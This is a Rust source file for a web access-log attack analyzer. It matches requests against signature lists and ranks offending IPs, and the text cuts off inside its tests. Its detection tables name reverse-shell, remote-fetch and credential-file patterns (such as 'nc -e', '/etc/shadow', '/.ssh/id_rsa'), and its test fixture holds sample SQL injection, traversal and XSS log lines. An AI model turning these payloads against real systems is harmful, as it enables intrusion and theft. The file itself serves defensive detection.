//! weblog-attack-analyzer core — pure compute, shared by the chat skill block and
//! the web page. No wafer/wasm-bindgen deps — deterministic pure Rust.
//!
//! Parses web-server **access logs** — Apache/Nginx common (CLF) and combined,
//! plus IIS W3C extended (`#Fields:` header) — and screens every request against
//! a curated signature set for **SQL injection**, **XSS**, **path traversal**,
//! **remote code execution**, **file inclusion**, known **vulnerability-scanner**
//! user agents, and **sensitive-path probes**. Percent-decoding (single and
//! double) is applied before matching so obfuscated payloads still hit.
//!
//! Alongside the per-request findings it aggregates per-source-IP offender stats
//! — total requests, flagged requests, 404s and 401/403s — and flags
//! `high-volume`, `enumeration` and `brute-force` behaviour against user-set
//! thresholds.
//!
//! Renders an analyst **report** (default), a Markdown **table**, a **json**
//! array, or **csv**; filter by attack category and by minimum severity.

use regex::Regex;
use std::collections::BTreeMap;
use std::fmt::Write as _;

/// Default finding cap when `limit` is 0/unset.
const DEFAULT_LIMIT: u32 = 500;
/// Hard upper bound the `limit` param is clamped to.
pub const MAX_LIMIT: u32 = 5000;
/// Default `offender_threshold` when 0/unset: requests from one IP to call it high-volume.
const DEFAULT_OFFENDER_THRESHOLD: u32 = 20;
/// Default `error_threshold` when 0/unset: 404s (or 401/403s) from one IP to flag it.
const DEFAULT_ERROR_THRESHOLD: u32 = 5;
/// Hard upper bound both thresholds are clamped to.
pub const MAX_THRESHOLD: u32 = 100_000;
/// How many source IPs the report's offender section lists.
const TOP_OFFENDERS: usize = 10;
/// Longest request target rendered inline in the report before it is elided.
const TARGET_ELIDE: usize = 110;

// ---------------------------------------------------------------------------
// Categories + severities
// ---------------------------------------------------------------------------

/// The attack class a flagged request falls into (derived from signatures,
/// never chosen by the user).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Cat {
    Sqli,
    Rce,
    Traversal,
    FileInclude,
    Xss,
    Scanner,
    Probe,
}

impl Cat {
    fn label(self) -> &'static str {
        match self {
            Cat::Sqli => "sqli",
            Cat::Rce => "rce",
            Cat::Traversal => "traversal",
            Cat::FileInclude => "file-include",
            Cat::Xss => "xss",
            Cat::Scanner => "scanner",
            Cat::Probe => "probe",
        }
    }

    fn severity(self) -> Severity {
        match self {
            Cat::Sqli | Cat::Rce => Severity::Critical,
            Cat::Traversal | Cat::FileInclude | Cat::Xss => Severity::High,
            Cat::Scanner => Severity::Medium,
            Cat::Probe => Severity::Low,
        }
    }

    /// Report/table ordering: worst first, then alphabetical within a severity.
    const ALL: [Cat; 7] = [
        Cat::Sqli,
        Cat::Rce,
        Cat::FileInclude,
        Cat::Traversal,
        Cat::Xss,
        Cat::Scanner,
        Cat::Probe,
    ];
}

/// Finding severity, ordered so `>=` implements the `min_severity` filter.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

impl Severity {
    fn label(self) -> &'static str {
        match self {
            Severity::Low => "low",
            Severity::Medium => "medium",
            Severity::High => "high",
            Severity::Critical => "critical",
        }
    }

    fn parse(s: &str) -> Result<Option<Severity>, String> {
        Ok(match s.trim().to_ascii_lowercase().as_str() {
            "" | "all" => None,
            "low" => Some(Severity::Low),
            "medium" => Some(Severity::Medium),
            "high" => Some(Severity::High),
            "critical" => Some(Severity::Critical),
            other => {
                return Err(format!(
                    "unknown min_severity {other:?} — expected one of: all, low, medium, high, critical"
                ))
            }
        })
    }
}

/// The `category` filter the user selects.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CatFilter {
    All,
    One(Cat),
}

impl CatFilter {
    pub fn parse(s: &str) -> Result<CatFilter, String> {
        Ok(match s.trim().to_ascii_lowercase().as_str() {
            "" | "all" => CatFilter::All,
            "sqli" => CatFilter::One(Cat::Sqli),
            "xss" => CatFilter::One(Cat::Xss),
            "traversal" => CatFilter::One(Cat::Traversal),
            "rce" => CatFilter::One(Cat::Rce),
            "file-include" => CatFilter::One(Cat::FileInclude),
            "scanner" => CatFilter::One(Cat::Scanner),
            "probe" => CatFilter::One(Cat::Probe),
            other => {
                return Err(format!(
                    "unknown category {other:?} — expected one of: all, sqli, xss, traversal, rce, file-include, scanner, probe"
                ))
            }
        })
    }

    fn keeps(self, c: Cat) -> bool {
        match self {
            CatFilter::All => true,
            CatFilter::One(want) => want == c,
        }
    }
}

/// Output shape.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Output {
    Report,
    Table,
    Json,
    Csv,
    /// One offending source IP per line, ready to paste into a deny list.
    Blocklist,
}

impl Output {
    pub fn parse(s: &str) -> Result<Output, String> {
        Ok(match s.trim().to_ascii_lowercase().as_str() {
            "" | "report" => Output::Report,
            "table" => Output::Table,
            "json" => Output::Json,
            "csv" => Output::Csv,
            "blocklist" => Output::Blocklist,
            other => return Err(format!(
                "unknown output {other:?} — expected one of: report, table, json, csv, blocklist"
            )),
        })
    }
}

// ---------------------------------------------------------------------------
// Signatures
// ---------------------------------------------------------------------------

/// A single attack signature: a lowercase substring, its category, and the
/// short name shown in the `matched` column.
struct Sig {
    cat: Cat,
    name: &'static str,
    needle: &'static str,
}

macro_rules! sig {
    ($cat:expr, $name:literal, $needle:literal) => {
        Sig {
            cat: $cat,
            name: $name,
            needle: $needle,
        }
    };
}

/// Signatures matched against the request target (path + query string), raw and
/// percent-decoded. Ordered worst-class-first so `matched` reads sensibly.
const TARGET_SIGS: &[Sig] = &[
    // --- SQL injection ---------------------------------------------------
    sig!(Cat::Sqli, "union select", "union select"),
    sig!(Cat::Sqli, "union all select", "union all select"),
    sig!(Cat::Sqli, "or 1=1", "or 1=1"),
    sig!(Cat::Sqli, "boolean tautology", "' or '1'='1"),
    sig!(Cat::Sqli, "boolean tautology", "\" or \"1\"=\"1"),
    sig!(Cat::Sqli, "information_schema", "information_schema"),
    sig!(Cat::Sqli, "time-based sleep", "sleep("),
    sig!(Cat::Sqli, "time-based benchmark", "benchmark("),
    sig!(Cat::Sqli, "waitfor delay", "waitfor delay"),
    sig!(Cat::Sqli, "xp_cmdshell", "xp_cmdshell"),
    sig!(Cat::Sqli, "load_file", "load_file("),
    sig!(Cat::Sqli, "into outfile", "into outfile"),
    sig!(Cat::Sqli, "mysql version probe", "@@version"),
    sig!(Cat::Sqli, "error-based extractvalue", "extractvalue("),
    sig!(Cat::Sqli, "error-based updatexml", "updatexml("),
    sig!(Cat::Sqli, "group_concat", "group_concat("),
    sig!(Cat::Sqli, "stacked drop table", "; drop table"),
    sig!(Cat::Sqli, "mysql inline comment", "/*!"),
    sig!(Cat::Sqli, "quote-comment break", "'--"),
    // --- Remote code execution -------------------------------------------
    sig!(Cat::Rce, "log4shell jndi", "${jndi:"),
    sig!(Cat::Rce, "shell command substitution", "$("),
    sig!(Cat::Rce, "shell binary", "/bin/sh"),
    sig!(Cat::Rce, "shell binary", "/bin/bash"),
    sig!(Cat::Rce, "windows shell", "cmd.exe"),
    sig!(Cat::Rce, "powershell", "powershell"),
    sig!(Cat::Rce, "php shell_exec", "shell_exec("),
    sig!(Cat::Rce, "php passthru", "passthru("),
    sig!(Cat::Rce, "php system", "system("),
    sig!(Cat::Rce, "chained whoami", "whoami"),
    sig!(Cat::Rce, "remote fetch", "wget "),
    sig!(Cat::Rce, "remote fetch", "curl "),
    sig!(Cat::Rce, "netcat reverse shell", "nc -e"),
    // --- File inclusion ---------------------------------------------------
    sig!(Cat::FileInclude, "php://input", "php://input"),
    sig!(Cat::FileInclude, "php://filter", "php://filter"),
    sig!(Cat::FileInclude, "data:// wrapper", "data://"),
    sig!(Cat::FileInclude, "expect:// wrapper", "expect://"),
    sig!(Cat::FileInclude, "zip:// wrapper", "zip://"),
    sig!(Cat::FileInclude, "file:// wrapper", "file://"),
    sig!(Cat::FileInclude, "remote include", "=http://"),
    sig!(Cat::FileInclude, "remote include", "=https://"),
    sig!(Cat::FileInclude, "remote include", "=ftp://"),
    // --- Path traversal ---------------------------------------------------
    sig!(Cat::Traversal, "dot-dot-slash", "../"),
    sig!(Cat::Traversal, "dot-dot-backslash", "..\\"),
    sig!(Cat::Traversal, "semicolon traversal", "..;/"),
    sig!(Cat::Traversal, "unix passwd file", "/etc/passwd"),
    sig!(Cat::Traversal, "unix shadow file", "/etc/shadow"),
    sig!(Cat::Traversal, "proc environ", "/proc/self/environ"),
    sig!(Cat::Traversal, "windows ini", "win.ini"),
    sig!(Cat::Traversal, "windows boot.ini", "boot.ini"),
    sig!(Cat::Traversal, "windows system path", "c:\\windows"),
    // --- Cross-site scripting ---------------------------------------------
    sig!(Cat::Xss, "script tag", "<script"),
    sig!(Cat::Xss, "script close tag", "</script"),
    sig!(Cat::Xss, "javascript: uri", "javascript:"),
    sig!(Cat::Xss, "onerror handler", "onerror="),
    sig!(Cat::Xss, "onload handler", "onload="),
    sig!(Cat::Xss, "onmouseover handler", "onmouseover="),
    sig!(Cat::Xss, "onfocus handler", "onfocus="),
    sig!(Cat::Xss, "alert()", "alert("),
    sig!(Cat::Xss, "prompt()", "prompt("),
    sig!(Cat::Xss, "document.cookie", "document.cookie"),
    sig!(Cat::Xss, "svg payload", "<svg"),
    sig!(Cat::Xss, "iframe injection", "<iframe"),
    sig!(Cat::Xss, "img payload", "<img"),
    sig!(Cat::Xss, "fromcharcode", "fromcharcode"),
    // --- Sensitive-path probes --------------------------------------------
    sig!(Cat::Probe, "dotenv file", "/.env"),
    sig!(Cat::Probe, "git metadata", "/.git/"),
    sig!(Cat::Probe, "svn metadata", "/.svn/"),
    sig!(Cat::Probe, "aws credentials", "/.aws/credentials"),
    sig!(Cat::Probe, "ssh private key", "/.ssh/id_rsa"),
    sig!(Cat::Probe, "wordpress login", "/wp-login.php"),
    sig!(Cat::Probe, "wordpress xmlrpc", "/xmlrpc.php"),
    sig!(Cat::Probe, "wordpress admin", "/wp-admin"),
    sig!(Cat::Probe, "phpmyadmin", "/phpmyadmin"),
    sig!(Cat::Probe, "adminer", "/adminer.php"),
    sig!(Cat::Probe, "phpunit eval-stdin", "/vendor/phpunit"),
    sig!(Cat::Probe, "spring actuator", "/actuator/env"),
    sig!(Cat::Probe, "solr admin", "/solr/admin"),
    sig!(Cat::Probe, "cgi-bin", "/cgi-bin/"),
    sig!(Cat::Probe, "tomcat manager", "/manager/html"),
    sig!(Cat::Probe, "apache server-status", "/server-status"),
    sig!(Cat::Probe, "sql dump", "/backup.sql"),
    sig!(Cat::Probe, "uploaded webshell", "/shell.php"),
];

/// Signatures matched against the user-agent string only.
const UA_SIGS: &[Sig] = &[
    sig!(Cat::Scanner, "sqlmap", "sqlmap"),
    sig!(Cat::Scanner, "nikto", "nikto"),
    sig!(Cat::Scanner, "nmap", "nmap"),
    sig!(Cat::Scanner, "masscan", "masscan"),
    sig!(Cat::Scanner, "zgrab", "zgrab"),
    sig!(Cat::Scanner, "nessus", "nessus"),
    sig!(Cat::Scanner, "acunetix", "acunetix"),
    sig!(Cat::Scanner, "netsparker", "netsparker"),
    sig!(Cat::Scanner, "openvas", "openvas"),
    sig!(Cat::Scanner, "dirbuster", "dirbuster"),
    sig!(Cat::Scanner, "gobuster", "gobuster"),
    sig!(Cat::Scanner, "feroxbuster", "feroxbuster"),
    sig!(Cat::Scanner, "ffuf", "ffuf"),
    sig!(Cat::Scanner, "wfuzz", "wfuzz"),
    sig!(Cat::Scanner, "wpscan", "wpscan"),
    sig!(Cat::Scanner, "joomscan", "joomscan"),
    sig!(Cat::Scanner, "nuclei", "nuclei"),
    sig!(Cat::Scanner, "hydra", "hydra"),
    sig!(Cat::Scanner, "metasploit", "metasploit"),
    sig!(Cat::Scanner, "commix", "commix"),
    sig!(Cat::Scanner, "xsser", "xsser"),
    sig!(Cat::Scanner, "arachni", "arachni"),
    sig!(Cat::Scanner, "w3af", "w3af"),
    sig!(Cat::Scanner, "skipfish", "skipfish"),
    sig!(Cat::Scanner, "havij", "havij"),
    sig!(Cat::Scanner, "zmeu", "zmeu"),
    sig!(Cat::Scanner, "morfeus", "morfeus"),
    sig!(Cat::Scanner, "libwww-perl", "libwww-perl"),
    sig!(Cat::Scanner, "whatweb", "whatweb"),
];

// ---------------------------------------------------------------------------
// Parsed request + finding
// ---------------------------------------------------------------------------

/// One parsed access-log request.
#[derive(Debug, Clone)]
pub struct Request {
    pub line_no: usize,
    pub ip: String,
    pub ts: String,
    pub method: String,
    pub target: String,
    pub status: u16,
    pub user_agent: String,
}

/// One flagged request.
#[derive(Debug, Clone)]
pub struct Finding {
    pub req: Request,
    /// Highest-severity category matched.
    pub cat: Cat,
    pub severity: Severity,
    /// Every distinct signature name that matched, in signature-table order.
    pub matched: Vec<String>,
    /// True when a match only appeared after percent-decoding the target.
    pub decoded: bool,
}

/// Per-source-IP aggregate.
#[derive(Debug, Clone, Default)]
struct Offender {
    requests: u32,
    flagged: u32,
    not_found: u32,
    auth_denied: u32,
    /// First scanner user agent seen from this IP, if any.
    scanner: Option<String>,
}

// ---------------------------------------------------------------------------
// Parsing
// ---------------------------------------------------------------------------

/// Apache/Nginx common + combined. The optional trailing group is what makes a
/// line "combined"; quoted fields allow backslash escapes (`\"` inside a UA).
fn clf_re() -> Regex {
    Regex::new(
        r#"^(?P<ip>\S+)\s+(?P<ident>\S+)\s+(?P<user>\S+)\s+\[(?P<ts>[^\]]*)\]\s+"(?P<req>(?:[^"\\]|\\.)*)"\s+(?P<status>\d{3}|-)\s+(?P<size>\S+)(?:\s+"(?P<referer>(?:[^"\\]|\\.)*)"\s+"(?P<ua>(?:[^"\\]|\\.)*)")?"#,
    )
    .expect("static CLF regex compiles")
}

/// Percent-decode `%XX` escapes and `+` (query-string space). Invalid escapes
/// are left verbatim so nothing is silently lost.
fn percent_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'%' if i + 2 < bytes.len() => {
                let hi = (bytes[i + 1] as char).to_digit(16);
                let lo = (bytes[i + 2] as char).to_digit(16);
                match (hi, lo) {
                    (Some(h), Some(l)) => {
                        out.push((h * 16 + l) as u8);
                        i += 3;
                    }
                    _ => {
                        out.push(bytes[i]);
                        i += 1;
                    }
                }
            }
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Split an IIS `#Fields:` directive into column names.
fn iis_fields(line: &str) -> Option<Vec<String>> {
    let rest = line.trim().strip_prefix("#Fields:")?;
    Some(rest.split_whitespace().map(|s| s.to_string()).collect())
}

fn iis_get<'a>(cols: &'a [&'a str], fields: &[String], want: &str) -> &'a str {
    fields
        .iter()
        .position(|f| f == want)
        .and_then(|i| cols.get(i).copied())
        .unwrap_or("-")
}

/// Parse every recognisable line. Returns the requests plus the detected format
/// label and the count of lines that looked like data but didn't parse.
fn parse_lines(logs: &str) -> (Vec<Request>, &'static str, usize) {
    let re = clf_re();
    let mut reqs = Vec::new();
    let mut iis_cols: Option<Vec<String>> = None;
    let (mut n_clf, mut n_iis, mut n_ua, mut skipped) = (0usize, 0usize, 0usize, 0usize);

    for (idx, raw) in logs.lines().enumerate() {
        let line = raw.trim_end_matches('\r');
        let line_no = idx + 1;
        if line.trim().is_empty() {
            continue;
        }
        if line.trim_start().starts_with('#') {
            if let Some(f) = iis_fields(line) {
                iis_cols = Some(f);
            }
            continue;
        }
        if let Some(c) = re.captures(line) {
            let req_line = c.name("req").map(|m| m.as_str()).unwrap_or("");
            let mut parts = req_line.split_whitespace();
            let method = parts.next().unwrap_or("-").to_string();
            let target = parts.next().unwrap_or("-").to_string();
            let ua = c.name("ua").map(|m| m.as_str()).unwrap_or("").to_string();
            if !ua.is_empty() && ua != "-" {
                n_ua += 1;
            }
            let ts = c
                .name("ts")
                .map(|m| m.as_str().split(' ').next().unwrap_or("").to_string())
                .unwrap_or_default();
            reqs.push(Request {
                line_no,
                ip: c.name("ip").map(|m| m.as_str()).unwrap_or("-").to_string(),
                ts,
                method,
                target,
                status: c
                    .name("status")
                    .and_then(|m| m.as_str().parse::<u16>().ok())
                    .unwrap_or(0),
                user_agent: ua,
            });
            n_clf += 1;
            continue;
        }
        if let Some(fields) = iis_cols.as_ref() {
            let cols: Vec<&str> = line.split_whitespace().collect();
            if cols.len() >= fields.len().min(4) {
                let stem = iis_get(&cols, fields, "cs-uri-stem");
                let query = iis_get(&cols, fields, "cs-uri-query");
                let target = if query == "-" || query.is_empty() {
                    stem.to_string()
                } else {
                    format!("{stem}?{query}")
                };
                let ua = iis_get(&cols, fields, "cs(User-Agent)").replace('+', " ");
                if ua != "-" && !ua.is_empty() {
                    n_ua += 1;
                }
                let date = iis_get(&cols, fields, "date");
                let time = iis_get(&cols, fields, "time");
                let ts = match (date, time) {
                    ("-", "-") => String::new(),
                    ("-", t) => t.to_string(),
                    (d, "-") => d.to_string(),
                    (d, t) => format!("{d} {t}"),
                };
                reqs.push(Request {
                    line_no,
                    ip: iis_get(&cols, fields, "c-ip").to_string(),
                    ts,
                    method: iis_get(&cols, fields, "cs-method").to_string(),
                    target,
                    status: iis_get(&cols, fields, "sc-status")
                        .parse::<u16>()
                        .unwrap_or(0),
                    user_agent: ua,
                });
                n_iis += 1;
                continue;
            }
        }
        skipped += 1;
    }

    let format = match (n_clf, n_iis) {
        (0, 0) => "unknown",
        (0, _) => "iis",
        (_, 0) => {
            if n_ua > 0 {
                "combined"
            } else {
                "common"
            }
        }
        _ => "mixed",
    };
    (reqs, format, skipped)
}

// ---------------------------------------------------------------------------
// Detection
// ---------------------------------------------------------------------------

/// Screen one request. `decode` also matches against the single- and
/// double-percent-decoded target so encoded payloads are caught.
fn screen(req: &Request, decode: bool) -> Option<Finding> {
    let raw = req.target.to_ascii_lowercase();
    let once = percent_decode(&raw);
    let twice = percent_decode(&once);

    let mut hits: Vec<(Cat, &'static str)> = Vec::new();
    let mut decoded_only = false;

    for sig in TARGET_SIGS {
        let in_raw = raw.contains(sig.needle);
        let in_dec = decode && (once.contains(sig.needle) || twice.contains(sig.needle));
        if in_raw || in_dec {
            if !in_raw {
                decoded_only = true;
            }
            hits.push((sig.cat, sig.name));
        }
    }

    let ua = req.user_agent.to_ascii_lowercase();
    for sig in UA_SIGS {
        if ua.contains(sig.needle) {
            hits.push((sig.cat, sig.name));
        }
    }

    if hits.is_empty() {
        return None;
    }

    // Highest severity wins; ties break on Cat's declaration order.
    let cat = hits
        .iter()
        .map(|(c, _)| *c)
        .max_by_key(|c| (c.severity(), std::cmp::Reverse(*c)))
        .expect("hits is non-empty");

    let mut matched: Vec<String> = Vec::new();
    for (_, name) in &hits {
        let name = (*name).to_string();
        if !matched.contains(&name) {
            matched.push(name);
        }
    }

    Some(Finding {
        req: req.clone(),
        cat,
        severity: cat.severity(),
        matched,
        decoded: decoded_only,
    })
}

// ---------------------------------------------------------------------------
// Public entry point
// ---------------------------------------------------------------------------

/// Analyze pasted access-log text and render the requested output.
///
/// * `category` — `all` | `sqli` | `xss` | `traversal` | `rce` | `file-include` | `scanner` | `probe`
/// * `min_severity` — `all` | `low` | `medium` | `high` | `critical`
/// * `output` — `report` | `table` | `json` | `csv` | `blocklist`
/// * `offender_threshold` — requests from one IP to flag `high-volume` (0 → 20)
/// * `error_threshold` — 404s (or 401/403s) from one IP to flag it (0 → 5)
/// * `decode` — also match percent-decoded targets (single + double)
/// * `limit` — maximum findings rendered (0 → 500, clamped to `MAX_LIMIT`)
#[allow(clippy::too_many_arguments)]
pub fn analyze(
    logs: &str,
    category: &str,
    min_severity: &str,
    output: &str,
    offender_threshold: u32,
    error_threshold: u32,
    decode: bool,
    limit: u32,
) -> Result<String, String> {
    let cat_filter = CatFilter::parse(category)?;
    let min_sev = Severity::parse(min_severity)?;
    let out = Output::parse(output)?;
    let limit = if limit == 0 {
        DEFAULT_LIMIT
    } else {
        limit.min(MAX_LIMIT)
    } as usize;
    let vol_threshold = if offender_threshold == 0 {
        DEFAULT_OFFENDER_THRESHOLD
    } else {
        offender_threshold.min(MAX_THRESHOLD)
    };
    let err_threshold = if error_threshold == 0 {
        DEFAULT_ERROR_THRESHOLD
    } else {
        error_threshold.min(MAX_THRESHOLD)
    };

    if logs.trim().is_empty() {
        return Err("no log text — paste Apache/Nginx access-log lines (common or combined) or an IIS W3C log".into());
    }

    let (requests, format, skipped) = parse_lines(logs);
    if requests.is_empty() {
        let sample = logs
            .lines()
            .find(|l| !l.trim().is_empty())
            .unwrap_or("")
            .chars()
            .take(80)
            .collect::<String>();
        return Err(format!(
            "no access-log requests recognised — expected Apache/Nginx common or combined lines \
             (`IP - - [ts] \"GET /path HTTP/1.1\" 200 123`) or an IIS W3C log with a `#Fields:` \
             header; first line was: {sample:?}"
        ));
    }

    // Per-IP aggregates cover EVERY request, not just the filtered findings.
    let mut offenders: BTreeMap<String, Offender> = BTreeMap::new();
    let mut all_findings: Vec<Finding> = Vec::new();
    for req in &requests {
        let finding = screen(req, decode);
        let ua_lower = req.user_agent.to_ascii_lowercase();
        let is_scanner_ua = UA_SIGS.iter().any(|s| ua_lower.contains(s.needle));

        let entry = offenders.entry(req.ip.clone()).or_default();
        entry.requests += 1;
        match req.status {
            404 => entry.not_found += 1,
            401 | 403 => entry.auth_denied += 1,
            _ => {}
        }
        if finding.is_some() {
            entry.flagged += 1;
        }
        // Record the scanner UA even when a nastier payload on the same request
        // wins the category (a sqlmap hit is classified `sqli`, not `scanner`).
        if is_scanner_ua && entry.scanner.is_none() && !req.user_agent.is_empty() {
            entry.scanner = Some(req.user_agent.clone());
        }
        if let Some(f) = finding {
            all_findings.push(f);
        }
    }

    let flagged_total = all_findings.len();
    let kept: Vec<&Finding> = all_findings
        .iter()
        .filter(|f| cat_filter.keeps(f.cat))
        .filter(|f| min_sev.is_none_or_at_most(f.severity))
        .collect();
    let kept_total = kept.len();
    let shown: Vec<&Finding> = kept.iter().copied().take(limit).collect();

    Ok(match out {
        Output::Report => render_report(
            &requests,
            format,
            skipped,
            &offenders,
            flagged_total,
            kept_total,
            &shown,
            vol_threshold,
            err_threshold,
        ),
        Output::Table => render_table(&shown),
        Output::Json => render_json(&shown),
        Output::Csv => render_csv(&shown),
        Output::Blocklist => render_blocklist(&offenders, vol_threshold, err_threshold),
    })
}

/// `Option<Severity>` helper: `None` = "all", otherwise keep `sev >= min`.
trait SevFilter {
    fn is_none_or_at_most(&self, sev: Severity) -> bool;
}

impl SevFilter for Option<Severity> {
    fn is_none_or_at_most(&self, sev: Severity) -> bool {
        match self {
            None => true,
            Some(min) => sev >= *min,
        }
    }
}

// ---------------------------------------------------------------------------
// Renderers
// ---------------------------------------------------------------------------

fn elide(s: &str) -> String {
    if s.chars().count() <= TARGET_ELIDE {
        return s.to_string();
    }
    let head: String = s.chars().take(TARGET_ELIDE).collect();
    format!("{head}…")
}

#[allow(clippy::too_many_arguments)]
fn render_report(
    requests: &[Request],
    format: &str,
    skipped: usize,
    offenders: &BTreeMap<String, Offender>,
    flagged_total: usize,
    kept_total: usize,
    shown: &[&Finding],
    vol_threshold: u32,
    err_threshold: u32,
) -> String {
    let mut out = String::new();
    let _ = write!(
        out,
        "Weblog attack analysis · {format} · {} requests · {flagged_total} flagged · {} source IPs",
        requests.len(),
        offenders.len()
    );
    if skipped > 0 {
        let _ = write!(out, " · {skipped} unparsed");
    }
    out.push('\n');

    let first = requests.first().map(|r| r.ts.as_str()).unwrap_or("");
    let last = requests.last().map(|r| r.ts.as_str()).unwrap_or("");
    if !first.is_empty() && !last.is_empty() {
        let _ = writeln!(out, "Window: {first} → {last}");
    }

    // Category tally over the FILTERED findings, worst class first.
    let _ = writeln!(out, "\nFindings by category:");
    let mut any_cat = false;
    for cat in Cat::ALL {
        let n = shown.iter().filter(|f| f.cat == cat).count();
        if n == 0 {
            continue;
        }
        any_cat = true;
        let _ = writeln!(
            out,
            "  {:<13} {n:>3}  {}",
            cat.label(),
            cat.severity().label()
        );
    }
    if !any_cat {
        let _ = writeln!(out, "  (none)");
    }

    // Offenders: most-flagged first, then busiest, then IP for stability.
    let mut ranked: Vec<(&String, &Offender)> = offenders.iter().collect();
    ranked.sort_by(|a, b| {
        b.1.flagged
            .cmp(&a.1.flagged)
            .then(b.1.requests.cmp(&a.1.requests))
            .then(a.0.cmp(b.0))
    });
    let _ = writeln!(out, "\nTop offenders:");
    for (ip, o) in ranked.iter().take(TOP_OFFENDERS) {
        let mut flags: Vec<&str> = Vec::new();
        if o.requests >= vol_threshold {
            flags.push("high-volume");
        }
        if o.not_found >= err_threshold {
            flags.push("enumeration");
        }
        if o.auth_denied >= err_threshold {
            flags.push("brute-force");
        }
        let flag_txt = if flags.is_empty() {
            "-".to_string()
        } else {
            flags.join(", ")
        };
        let _ = write!(
            out,
            "  {ip:<15} {:>4} req · {:>3} flagged · {:>3}×404 · {:>3}×401/403 · flags: {flag_txt}",
            o.requests, o.flagged, o.not_found, o.auth_denied
        );
        if let Some(ua) = &o.scanner {
            let _ = write!(out, " · scanner UA: {ua}");
        }
        out.push('\n');
    }

    let _ = writeln!(out, "\nFindings:");
    if shown.is_empty() {
        let _ = writeln!(out, "  (none matched the current filters)");
    }
    for (i, f) in shown.iter().enumerate() {
        let _ = writeln!(
            out,
            "  {}. [{}] {} · line {} · {} · {} {} → {}",
            i + 1,
            f.severity.label(),
            f.cat.label(),
            f.req.line_no,
            f.req.ip,
            f.req.method,
            elide(&f.req.target),
            f.req.status
        );
        let suffix = if f.decoded {
            " (after percent-decoding)"
        } else {
            ""
        };
        let _ = writeln!(out, "     matched: {}{suffix}", f.matched.join(", "));
    }
    if kept_total > shown.len() {
        let _ = writeln!(
            out,
            "\n(showing the first {} of {kept_total} matching findings — raise the limit to see more)",
            shown.len()
        );
    }
    out
}

fn render_table(shown: &[&Finding]) -> String {
    let mut out = String::from(
        "| # | Severity | Category | Line | Source IP | Method | Target | Status | Matched |\n\
         |---|---|---|---|---|---|---|---|---|\n",
    );
    for (i, f) in shown.iter().enumerate() {
        let _ = writeln!(
            out,
            "| {} | {} | {} | {} | {} | {} | {} | {} | {} |",
            i + 1,
            f.severity.label(),
            f.cat.label(),
            f.req.line_no,
            f.req.ip,
            f.req.method,
            elide(&f.req.target).replace('|', "\\|"),
            f.req.status,
            f.matched.join(", ").replace('|', "\\|")
        );
    }
    out
}

fn render_json(shown: &[&Finding]) -> String {
    let arr: Vec<serde_json::Value> = shown
        .iter()
        .map(|f| {
            serde_json::json!({
                "line": f.req.line_no,
                "severity": f.severity.label(),
                "category": f.cat.label(),
                "ip": f.req.ip,
                "time": f.req.ts,
                "method": f.req.method,
                "target": f.req.target,
                "status": f.req.status,
                "user_agent": f.req.user_agent,
                "matched": f.matched,
                "decoded": f.decoded,
            })
        })
        .collect();
    serde_json::to_string_pretty(&arr).unwrap_or_else(|e| format!("json error: {e}"))
}

fn csv_field(s: &str) -> String {
    if s.contains(',') || s.contains('"') || s.contains('\n') {
        format!("\"{}\"", s.replace('"', "\"\""))
    } else {
        s.to_string()
    }
}

fn render_csv(shown: &[&Finding]) -> String {
    let mut out =
        String::from("line,severity,category,ip,time,method,target,status,user_agent,matched\n");
    for f in shown {
        let _ = writeln!(
            out,
            "{},{},{},{},{},{},{},{},{},{}",
            f.req.line_no,
            f.severity.label(),
            f.cat.label(),
            csv_field(&f.req.ip),
            csv_field(&f.req.ts),
            csv_field(&f.req.method),
            csv_field(&f.req.target),
            f.req.status,
            csv_field(&f.req.user_agent),
            csv_field(&f.matched.join("; "))
        );
    }
    out
}

fn render_blocklist(
    offenders: &BTreeMap<String, Offender>,
    vol_threshold: u32,
    err_threshold: u32,
) -> String {
    let mut ips: Vec<&String> = offenders
        .iter()
        .filter(|(_, o)| {
            o.flagged > 0
                || o.requests >= vol_threshold
                || o.not_found >= err_threshold
                || o.auth_denied >= err_threshold
        })
        .map(|(ip, _)| ip)
        .collect();
    ips.sort();
    ips.into_iter()
        .map(|s| s.as_str())
        .collect::<Vec<_>>()
        .join("\n")
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    const COMBINED: &str = concat!(
        r#"203.0.113.5 - - [11/Mar/2024:09:14:02 +0000] "GET /products.php?id=1%27+UNION+SELECT+null,version()--+- HTTP/1.1" 200 512 "-" "sqlmap/1.7#stable (https://sqlmap.org)""#,
        "\n",
        r#"203.0.113.5 - - [11/Mar/2024:09:14:05 +0000] "GET /admin/../../etc/passwd HTTP/1.1" 404 153 "-" "sqlmap/1.7#stable (https://sqlmap.org)""#,
        "\n",
        r#"198.51.100.22 - - [11/Mar/2024:09:14:20 +0000] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 980 "https://example.test/" "Mozilla/5.0 (X11; Linux x86_64)""#,
        "\n",
        r#"192.0.2.7 - - [11/Mar/2024:09:14:30 +0000] "GET /.env HTTP/1.1" 404 0 "-" "Mozilla/5.0""#,
        "\n",
        r#"192.0.2.7 - - [11/Mar/2024:09:14:41 +0000] "GET /index.html HTTP/1.1" 200 4096 "-" "Mozilla/5.0""#,
    );

    /// Collapse runs of whitespace so column-padding changes don't make the
    /// content assertions brittle (exact layout is pinned by the page spec).
    fn squeeze(s: &str) -> String {
        s.split_whitespace().collect::<Vec<_>>().join(" ")
    }

    #[test]
    fn report_flags_sqli_xss_traversal_and_probes() {
        let out = analyze(COMBINED, "all", "all", "report", 0, 0, true, 0).unwrap();
        assert!(
            out.starts_with(
                "Weblog attack analysis · combined · 5 requests · 4 flagged · 3 source IPs\n"
            ),
            "{out}"
        );
        assert!(
            out.contains("Window: 11/Mar/2024:09:14:02 → 11/Mar/2024:09:14:41"),
            "{out}"
        );
        let flat = squeeze(&out);
